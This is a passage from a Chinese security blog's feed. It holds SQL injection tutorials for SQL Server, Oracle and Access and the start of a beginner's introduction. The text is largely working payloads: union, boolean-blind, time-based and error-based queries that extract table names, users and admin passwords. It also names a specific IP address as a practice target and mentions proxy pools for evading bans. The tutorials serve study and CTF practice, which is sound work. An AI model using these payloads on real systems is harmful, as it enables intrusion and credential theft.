href="https://baike.baidu.com/item/%E5%BE%AE%E6%9C%BA/5511409">微机</a>环境。它是一种高效率的、可靠性好的、适应高<a href="https://baike.baidu.com/item/%E5%90%9E%E5%90%90%E9%87%8F/157092">吞吐量</a>的数据库方案。</p><p><strong>注意：SQL server的最高权限是sa，Oracle的最高权限是dba。扩展：Windows的最高权限是system（不是admin！），Linux的最高权限是root。</strong></p><h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><h3 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a>SQL server</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>1.老规矩，先判断是否存在注入点。</p><p>2.用order by猜列数，注意联合查询不会显示重复内容，所以有时要在union后面加all。</p><p>3.联合查询找回显位，注意这里有些不一样，因为SQL server需要指定数据类型，所以判断时需要加单引号。例如：<code>?id=1&#39; union select null,&#39;null&#39;,null #</code>假设有三列，这里猜测第二个为回显位，则用单引号包围第二个null。如果网页回显null，则说明第二个是回显位。多个回显位以此类推。</p><p>4.爆库</p><p>例如：<code>?id=1&#39; union select null,(select db_name),null #</code></p><p>5.爆表</p><p>例如：<code>?id=1&#39; union select null,(select top 1 字段名 from 库名.dbo.sysobjects where xtype=&#39;u&#39;,null #</code></p><p>其中sysobjects是SQL server独有表,u代表用户创建的表。</p><p>6.爆字段</p><p>例如：<code>?id=1&#39; union select null,(select top 1 col_name(object_id(&#39;表名&#39;),n) from sysobjects,null #</code></p><p>其中n代表第几列，一般第一列是id。</p><p>7.爆值</p><p>例如：<code>?id=1&#39; union select null,(select top 1 字段名 from 表名),null #</code></p><p><em>扩展：</em></p><p><em>查看当前数据库版本：</em><code>?id=1&#39; union select null,(select @@version),null #</code></p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="其它方式"><a href="#其它方式" class="headerlink" title="其它方式"></a>其它方式</h4><p>sqlmap一把梭，或者超级SQL注入工具。</p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><h4 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>1.老规矩，先判断是否存在注入点。</p><p>2.用order by猜列数，注意联合查询不会显示重复内容，所以有时要在union后面加all。</p><p>3.联合查询找回显位，注意这里有些不一样，虽然Oracle也需要指定数据类型，判断方法与SQL server相同，但是Oracle规定每次查询时必须跟随表名。例如：<code>?id=1&#39; union select null,&#39;null&#39;,null from dual#</code></p><p>其中dual是Oracle独有表。</p><p>4.爆库</p><p>例如：<code>?id=1&#39; union select null,(select instance_name from V$INSTANCE),null from dual #</code></p><p>5.爆表</p><p>例如：<code>?id=1&#39; union select null,(select table_name from user_tables where rownum=1 and like &#39;%关键词%&#39;),null from dual #</code></p><p><strong>注意要加rownum&#x3D;1，因为Oracle每次只能显示一条数据。关键词可能是user,admin之类的敏感词。</strong></p><p>6.爆字段</p><p>例如：<code>?id=1&#39; union select null,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;表名&#39;),null from dual #</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select null,(select column_name from user_tab_columns where rownum=1 and table_name=&#x27;</span>表名<span class="hljs-string">&#x27; and column_name not in (&#x27;</span>字段名<span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span>字段名<span class="hljs-number">2</span><span class="hljs-string">&#x27;,...,&#x27;</span>字段名n<span class="hljs-string">&#x27;)),null from dual #</span><br></code></pre></td></tr></table></figure><p>7.爆值</p><p>例如：<code>?id=1&#39; union select null,(select 字段名1，字段名2,...,字段名n from &quot;表名&quot;),null from dual #</code></p><p><strong>注意实际表名要加双引号。</strong></p><p><em>扩展：</em></p><p><em>查看当前数据库版本：</em><code>?id=1&#39; union select null,(select banner from sys.v_$version where rownum=1),null from dual #</code></p><h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>0x01 利用decode函数盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">decode(字段或字段的运算，值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>，值<span class="hljs-number">3</span>）<br></code></pre></td></tr></table></figure><p>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3。</p><p>当然值1，值2，值3也可以是表达式，这个函数使得某些sql语句简单了许多。</p><p>使用方法：</p><p>比较大小:<code>select decode(sign(变量1-变量2),-1,变量1,变量2) from dual; --取较小值</code></p><p>其中sign()函数根据某个值是0、正数还是负数，分别返回0、1、-1。</p><p>所以在注入中的应用如下：</p><p>判断当前用户： <code>?username=SMITH&#39; and 1=(select decode(user,&#39;SCOTT&#39;,1,0) from dual) --</code></p><p>如果是SCOTT用户则返回1，不是则返回0.</p><p>当然也可以用字符逐个猜解，利用到substr()函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span>SMITH<span class="hljs-string">&#x27; and 1=(select decode(substr(user,1,1),&#x27;</span>S<span class="hljs-string">&#x27;,1,0) from dual) --</span><br></code></pre></td></tr></table></figure><p>获取当前用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)<br></code></pre></td></tr></table></figure><p>获取当前版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>获取当前admin表的帐号和密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> username<span class="hljs-operator">||</span>password <span class="hljs-keyword">from</span> admin)<br></code></pre></td></tr></table></figure><p>获取字符长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> length(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>把上述语句替换开头的<code>user</code>即可。</p><p>例如，逐个猜解用户名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>可以辅助burpsuite半自动注入。</p><p>0x02 利用instr函数盲注</p><p>instr函数可以从一个字符串中查找指定子串的位置。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> instr(<span class="hljs-string">&#x27;abcdefgh&#x27;</span>,<span class="hljs-string">&#x27;de&#x27;</span>) position <span class="hljs-keyword">from</span> dual<br></code></pre></td></tr></table></figure><p>返回结果是4，因为从1开始算，d排第四所以返回4。</p><p>在注入中的应用： <code>?id=1 and 1=(instr((select user from dual),&#39;SYS&#39;)) --</code></p><p>0x03 逐字猜解（和以前一样，这里不再赘述）</p><h4 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>Oracle的时间盲注通常使用DBMS_PIPE.RECEIVE_MESSAGE()，而另外一种便是decode()与高耗时SQL操作的组合，当然也可以是case，if 等方式与高耗时操作的组合，这里的高耗时操作指的是，例如：<code>(select count(*) from all_objects)</code>，对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。</p><p>0x01 利用DBMS_PIPE.RECEIVE_MESSAGE函数盲注</p><p>DBMS_LOCK.SLEEP()函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。</p><p>首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)。其次，只有数据库管理员才能使用DBMS_LOCK包。</p><p>在Oracle PL&#x2F;SQL中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：<code>dbms_pipe.receive_message(&#39;RDS&#39;, 10)</code></p><p>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。DBMS_LOCK.SLEEP()与之相反，它是一个可以用在SQL语句中的函数。</p><p>在注入中的应用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span> dbms_pipe.receive_message(<span class="hljs-string">&#x27;RDS&#x27;</span>, <span class="hljs-number">10</span>)<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>dbms_pipe.receive_message(<span class="hljs-string">&#x27;RDS&#x27;</span>, <span class="hljs-number">10</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>如果页面延时10秒返回，即存在注入。这里可以暂时理解成DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)。</p><p>0x02 利用decode函数盲注</p><p>decode不仅可以在布尔盲注中运用，也可以用在延迟盲注中。</p><p>在decode注入里加入延时语句。这里加入了我们的dbms_pipe.receive_message函数。</p><p>例如：<code>?id=1 and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual) --</code></p><p>当然，这里延迟的操作不一定用延迟函数，也可以使用花费更多时间去查询所有数据库的条目。</p><p>例如:<code>?id=1 and 1=(select decode(substr(user,1,1),&#39;S&#39;,(select count(*) from all_objects),0) from dual) and &#39;1&#39;=&#39;1&#39;</code></p><p>通过这种明显时间差也能判断注入表达式的结果。</p><h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><p>使用报错注入需要使用类似 1&#x3D;[报错语句]，1&gt;[报错语句]，使用比较运算符这样的方式进行报错注入（MYSQL仅使用函数报错即可），类似mssql报错注入的方式。</p><p><strong>utl_inaddr.get_host_name()进行报错注入</strong></p><p>utl_inaddr.get_host_address 本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。</p><p>我们传递的是一个sql 语句所以返回的就是语句执行的结果。oracle 在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。</p><p>例如，爆出当前用户： <code>?id=1 and 1=utl_inaddr.get_host_name((select user from dual))--</code></p><p><strong>ctxsys.drithsx.sn()进行报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>XMLType()进行报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">upper</span>(XMLType(chr(<span class="hljs-number">60</span>)<span class="hljs-operator">%</span><span class="hljs-number">7</span>c<span class="hljs-operator">%</span><span class="hljs-number">7</span>cchr(<span class="hljs-number">58</span>)<span class="hljs-operator">%</span><span class="hljs-number">7</span>c<span class="hljs-operator">%</span><span class="hljs-number">7</span>c(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">%</span><span class="hljs-number">7</span>c<span class="hljs-operator">%</span><span class="hljs-number">7</span>cchr(<span class="hljs-number">62</span>))) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>dbms_xdb_version.checkin()进行报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dbms_xdb_version.checkin((<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>bms_xdb_version.makeversioned()进报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dbms_xdb_version.makeversioned((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>dbms_xdb_version.uncheckout()进行报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dbms_xdb_version.uncheckout((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>dbms_utility.sqlid_to_sqlhash()进行报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>ordsys.ord_dicom.getmappingxpath()进行报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ordsys.ord_dicom.getmappingxpath((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual),<span class="hljs-keyword">user</span>,<span class="hljs-keyword">user</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><strong>decode()进行报错注入</strong></p><p>这种方式更偏向布尔盲注，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p><h4 id="其它方式-1"><a href="#其它方式-1" class="headerlink" title="其它方式"></a>其它方式</h4><p>sqlmap一把梭，或者超级SQL注入工具。如果遇到waf拦截，则需要修改sqlmap的脚本。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>脚本小子yyds！</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入（二）--Access注入</title>
    <link href="/2021/10/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-Access%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/10/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-Access%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Access数据库注入"><a href="#Access数据库注入" class="headerlink" title="Access数据库注入"></a>Access数据库注入</h1><h2 id="数据库简介"><a href="#数据库简介" class="headerlink" title="数据库简介"></a>数据库简介</h2><p>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 MicrosoftJet Database Engine 和 图形用户界面两项特点，是Microsoft Office 的系统程序之一。</p><p>Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。</p><p>注意：Access只有一个数据库，且一般搭配脚本语言ASP&#x2F;ASPX。</p><h2 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h2><p>库（只有一个）-&gt;表-&gt;字段-&gt;值</p><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> msysobjects)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>其中msysobjects是access独有的表，且外部无法访问。如果报错，则为access数据库，正常就是msSQL（即SQL server）。</p><p>但是，access数据库没有注释符，所以只能采用%00截断的方式。如果PHP中开启了魔术引号，则要把查询内容转换为十六进制。</p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><ul><li>联合查询</li><li>逐字猜解（盲注）</li></ul><h3 id="联合查询详细步骤"><a href="#联合查询详细步骤" class="headerlink" title="联合查询详细步骤"></a>联合查询详细步骤</h3><p>1.判断是否存在注入点：提交单引号或运用逻辑运算</p><p>例如：</p><p>提交单引号：<code>URL?id=1&#39;</code>若报错，则存在注入点</p><p>逻辑运算：<code>URL?id=1&#39; and 1=1#</code>正常，<code>URL?id=1&#39; and 1=2#</code>报错，则存在注入点</p><p>2.确定列名数目</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">URL?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 列名数</span><br></code></pre></td></tr></table></figure><p>这里以<a href="http://103.85.87.93:10000/Production/PRODUCT_DETAIL.asp?id=1513">靶场</a>为例，当order by后面是22时正常，23时报错，说明这个数据库有22个列名。</p><p>3.猜表名</p><p>猜对了继续联合查询：<code>URL?id=1513&#39; union select 1,2,......,22 from 表名</code>，猜不到算你倒霉（当然，可以结合网站源代码猜）。这样可以爆出显示位3和15，再把要查询的内容替换上面的3和15。</p><p>4.猜列名</p><p>（基本同上）</p><p>5.爆出数据</p><p>猜出列名就会返回数据。</p><h3 id="布尔盲注详细步骤"><a href="#布尔盲注详细步骤" class="headerlink" title="布尔盲注详细步骤"></a>布尔盲注详细步骤</h3><p>布尔盲注一般适用于页面没有回显字段 (不支持联合查询)，且web页面返回true 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false 使web页面返回true或者false，从而达到注入的目的来获取信息。常用函数有<code>ascii(),mid(),substr(),group_concat(),length()</code>等。</p><p>1.判断注入点和数据库种类</p><p>（同联合查询）</p><p>2.猜表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">0</span> <span class="hljs-operator">&lt;&gt;</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span> 表名)<br></code></pre></td></tr></table></figure><p>其中&lt;&gt;是不等于的意思，如果正常则存在该表。</p><p>3.猜记录数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> 表名)<span class="hljs-operator">=</span>n<br></code></pre></td></tr></table></figure><p>如果正常，则记录数为n。</p><p>4.猜列名（字段名）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> len(列名)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span>)<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>如果正常，则存在该列。</p><p>5.猜数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> len(列名)<span class="hljs-operator">&gt;</span>n)<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>如果正常，则该列长度为n。由于密码一般采用MD5加密，所以一般猜16位或32位。</p><p>6.爆出数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(mid(admin,位数,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> admin) <span class="hljs-operator">=</span>ascii值<br></code></pre></td></tr></table></figure><p>如果正常，则通过表转换成相应字母。</p><h3 id="时间盲注详细步骤"><a href="#时间盲注详细步骤" class="headerlink" title="时间盲注详细步骤"></a>时间盲注详细步骤</h3><p>时间盲注与布尔盲注相似，就是把<code>and</code>后面换成<code>if(查询语句，sleep(5),0)</code>，这里不再赘述。其中如果满足if语句条件（即数据库查询语句），则睡眠5秒，否则页面无变化。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>联合查询法很快但是兼容性差，逐字猜解法很慢且繁琐但是兼容性好。由于Access数据库只能靠暴力猜解，因此经常会猜解不到列名，这样的话可以使用偏移注入，猜解不到表名的话可以使用社工方法。至于布尔盲注和时间盲注，我们一般采用burpsuite半自动的方式，有条件的可以配合代理池使用，以免因为请求数过多被封ip。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入（一）--原理介绍和基础</title>
    <link href="/2021/07/28/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89-%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/07/28/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89-%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近刚刚结束“前端三剑客”的学习，而web方向在开始学习SQL注入。我个人觉得新手入门SQL注入有些难，而且碰到CTF题目也不太敢下手，所以在这里简单说一下新手需要注意的点。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="0x01-SQL注入原理介绍"><a href="#0x01-SQL注入原理介绍" class="headerlink" title="0x01 SQL注入原理介绍"></a>0x01 SQL注入原理介绍</h3><p>当Web应用向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><p>所以sql注入漏洞的本质是将用户输入的数据当做代码来执行。</p><p>sql注入的两个关键条件：用户可以控制输入的内容；web应用把用户输入的内容带进数据库执行。</p><h3 id="0x02-SQL注入基础"><a href="#0x02-SQL注入基础" class="headerlink" title="0x02 SQL注入基础"></a>0x02 SQL注入基础</h3><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">system_user</span>()：  系统用户名<br><br><span class="hljs-keyword">user</span>()：  用户名<br><br><span class="hljs-built_in">current_user</span>()： 当前用户名<br><br><span class="hljs-built_in">session_user</span>()：  链接数据库的用户名<br><br>database()： 数据库名<br><br>version()：  MySQL数据库版本<br><br>load_file()：  转成<span class="hljs-number">16</span>进制或者<span class="hljs-number">10</span>进制 MySQL读取本地文件的函数<br><br>@<span class="hljs-variable">@datadir</span>： 读取数据库路径<br><br>@<span class="hljs-variable">@basedir</span>： MySQL安装路径<br><br>@<span class="hljs-variable">@version</span>_compile_os： 操作系统<br><br>group_concat()：将括号中的所有参数拼接成一个字符串<br><br>substr(str,<span class="hljs-keyword">start</span>,length):截取str字符串中从<span class="hljs-keyword">start</span>开始，长度为length的字符串<br></code></pre></td></tr></table></figure><h4 id="必记的一库三表"><a href="#必记的一库三表" class="headerlink" title="必记的一库三表"></a>必记的一库三表</h4><p>一库：information_schema（MySQL默认数据库）</p><p>三表:</p><p>0x01 SCHEMATA：存储了MySQL下每一个数据库的相关信息</p><ul><li>schema_name（字段）：数据库名</li></ul><p>0x02 TABLES： 存储了MySQL下每一个表的相关信息</p><ul><li><p>TABLE_NAME（字段）：数据表名</p></li><li><p>TABLE_SCHEMATA（字段）：该数据表属于哪一个数据库</p></li></ul><p>0x03 